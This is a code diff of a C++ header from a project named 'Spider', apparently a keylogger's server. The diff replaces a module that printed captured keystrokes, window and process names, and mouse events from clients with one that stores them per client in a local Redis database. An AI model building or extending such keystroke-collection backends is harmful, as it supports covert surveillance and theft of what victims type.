@@ -2,8 +2,8 @@
 // Created by hippolyteb on 11/8/16.
 //
 
-#ifndef SPIDER_SERVER_OUTPUTSTDINMODULE_HPP
-#define SPIDER_SERVER_OUTPUTSTDINMODULE_HPP
+#ifndef SPIDER_SERVER_STORETODBMODULE_HPP
+#define SPIDER_SERVER_STORETODBMODULE_HPP
 
 #include <bits/unique_ptr.h>
 #include <iostream>
@@ -14,35 +14,38 @@
 #include "../ProtoEnvelopes/Proto/SpiderKeyloggingPayload.pb.h"
 #include "../ProtoEnvelopes/Proto/test.pb.h"
 #include "../ProtoEnvelopes/Proto/SpiderMouseEvent.pb.h"
+#include "../SpiderDatabaseDriver/SpiderTypedRepositoryDriver.hpp"
+#include "../SpiderDatabaseDriver/RedisDriver/RedisDriver.hpp"
 
-class OutputSTDOUTModule : public ISpiderBusinessModule {
+class StoreToDBModule : public ISpiderBusinessModule {
     std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>> _eventKeylogListener = std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>>(new SpiderEventListener<SpiderKeyLoggingPayload>());
     std::unique_ptr<ISpiderEventListener<SpiderMouseEvent>> _eventMouseListener = std::unique_ptr<ISpiderEventListener<SpiderMouseEvent>>(new SpiderEventListener<SpiderMouseEvent>());
     std::unique_ptr<ISpiderEventListener<testPayload>> _eventTestListener = std::unique_ptr<ISpiderEventListener<testPayload>>(new SpiderEventListener<testPayload>());
     std::unique_ptr<ISpiderEventEmitter> _eventEmitter = std::unique_ptr<ISpiderEventEmitter>(new SpiderEventEmitter());
+
+    std::unique_ptr<SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>> _keylogRepository = nullptr;
+    std::unique_ptr<SpiderTypedRepositoryDriver<SpiderMouseEvent>> _mouselogRepository = nullptr;
+
 private:
 
 public:
-    OutputSTDOUTModule() {
+    StoreToDBModule() {
+        RedisDriver *driver = new RedisDriver();
+        driver->Connect("127.0.0.1", 6379, "", "");
+        _keylogRepository = std::unique_ptr<SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>>(new SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>(driver));
+        driver = new RedisDriver();
+        driver->Connect("127.0.0.1", 6379, "", "");
+        _mouselogRepository = std::unique_ptr<SpiderTypedRepositoryDriver<SpiderMouseEvent>>(new SpiderTypedRepositoryDriver<SpiderMouseEvent>(driver));
+
+
         _eventKeylogListener->Register("SpiderKeyLoggingPayload", [&](std::string clientId, SpiderKeyLoggingPayload &payload) {
-            std::cout << "[Keylogging from client with ID " << clientId << "]" << std::endl;
-            if (payload.context().processname() != "" && payload.context().windowsname() != "")
-                std::cout << "From context : [Process : " << payload.context().processname() << "; Windows : " << payload.context().windowsname() <<"]" << std::endl;
-            if (payload.plaintextkeylog() != "")
-                std::cout << "==> " << payload.plaintextkeylog() << std::endl;
-            std::cout << "---------------------------------------------------" << std::endl;
+            _keylogRepository->PushElement("keylog" + clientId, payload);
         });
 
         _eventMouseListener->Register("SpiderMouseEvent", [&](std::string clientId, SpiderMouseEvent &payload) {
-            std::cout << "[Mouse activity from client with ID " << clientId << "]" << std::endl;
-            std::cout << "[TYPE : " << payload.type() << "] " << "X : " << payload.x() << " Y : " << payload.y() << std::endl;
-            std::cout << "---------------------------------------------------" << std::endl;
-        });
-
-        _eventTestListener->Register("testPayload", [&](std::string clientId, testPayload &payload){
-            std::cout << "testPayload : " << payload.content() << std::endl;
+            _mouselogRepository->PushElement("mouselog" + clientId, payload);
         });
     }
 };
 
-#endif //SPIDER_SERVER_OUTPUTSTDINMODULE_HPP
+#endif //SPIDER_SERVER_STORETODBMODULE_HPP
